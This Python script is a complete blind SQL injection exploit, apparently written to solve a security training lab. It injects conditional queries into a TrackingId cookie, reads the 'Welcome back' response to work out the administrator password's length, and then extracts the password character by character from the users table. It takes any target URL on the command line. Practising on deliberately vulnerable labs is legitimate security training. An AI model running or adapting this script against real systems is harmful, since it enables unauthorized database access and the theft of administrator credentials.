import argparse
import sys
import urllib3
import requests
import urllib.parse
import string

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


def get_proxy_config():
    """Returns the proxy configuration."""
    return {
        'http': 'http://127.0.0.1:8080',
        'https': 'http://127.0.0.1:8080'
    }


def perform_request(base_url, tracking_id, sql_payload, proxies):
    """Sends the request with the injected SQL payload in the cookie."""
    cookies = {'TrackingId': tracking_id + urllib.parse.quote(sql_payload)}
    try:
        response = requests.get(base_url, cookies=cookies,
                                verify=False, proxies=proxies)
        # In this blind SQLi lab, the condition is confirmed if "Welcome back" is in the response.
        return "Welcome back" in response.text
    except requests.RequestException as e:
        print(f"(-) An error occurred during the request: {e}")
        return False


def get_tracking_id(base_url, proxies):
    """Fetches the initial TrackingId cookie from the target website."""
    print("(+) Fetching initial TrackingId cookie...")
    try:
        response = requests.get(base_url, verify=False, proxies=proxies)
        tracking_id = response.cookies.get('TrackingId')
        if tracking_id:
            print(f"(✓) Found TrackingId: {tracking_id}\n")
            return tracking_id
        else:
            print("(-) TrackingId cookie not found in initial response.")
            return None
    except requests.RequestException as e:
        print(f"(-) An error occurred while fetching the cookie: {e}")
        return None


def find_password_length(base_url, tracking_id, proxies):
    """Determines the length of the administrator's password."""
    print("(+) Determining administrator password length...\n")
    for i in range(1, 51):
        payload = f"' AND (SELECT LENGTH(password) FROM users WHERE username = 'administrator') = {i}--"
        print(f"    ➤ Testing length: {i}", end='\r')
        if perform_request(base_url, tracking_id, payload, proxies):
            print(f"\n(✓) Administrator password is {i} characters long.\n")
            return i
    print("\n(-) Could not determine administrator password length.")
    return None


def extract_admin_password(base_url, tracking_id, password_length, proxies):
    """Extracts the administrator's password character by character."""
    print("(+) Extracting administrator password...\n")
    password = ""
    # Alphanumeric character set for the password
    chars = string.ascii_letters + string.digits
    for i in range(1, password_length + 1):
        for char in chars:
            payload = f"' AND (SELECT SUBSTRING(password, {i}, 1) FROM users WHERE username = 'administrator') = '{char}'--"

            # Display progress on the same line
            progress_text = f"    ➤ Found: {password}{char}"
            sys.stdout.write(progress_text + ' ' *
                             (50 - len(progress_text)) + '\r')
            sys.stdout.flush()

            if perform_request(base_url, tracking_id, payload, proxies):
                password += char
                break

    # Clear the progress line
    sys.stdout.write(' ' * 50 + '\r')
    sys.stdout.flush()

    if len(password) == password_length:
        print(f"(✓) Successfully extracted administrator password.\n")
        return password
    else:
        print("(-) Failed to extract the full password.")
        return None


def get_cli_args():
    """Parses command-line arguments."""
    parser = argparse.ArgumentParser(
        description=(
            "Scenario: Extract administrator password using blind SQL injection with conditional responses.\n\n"
            "Example:\n"
            "  python3 blind_sqli_solver.py https://vulnerable-site.com\n"
        ),
        formatter_class=argparse.RawTextHelpFormatter
    )
    parser.add_argument(
        "url", help="Target URL (e.g., https://vulnerable-site.com)")
    return parser.parse_args()


def main():
    """Main function to orchestrate the exploit."""
    proxies = get_proxy_config()
    args = get_cli_args()
    base_url = args.url.strip('/')

    print(f"\n(+) Targeting: {base_url}\n")

    tracking_id = get_tracking_id(base_url, proxies)
    if not tracking_id:
        return

    password_length = find_password_length(base_url, tracking_id, proxies)
    if not password_length:
        return

    admin_password = extract_admin_password(
        base_url, tracking_id, password_length, proxies)
    if admin_password:
        print(f"(+) Administrator Password: {admin_password}\n")


if __name__ == "__main__":
    main()
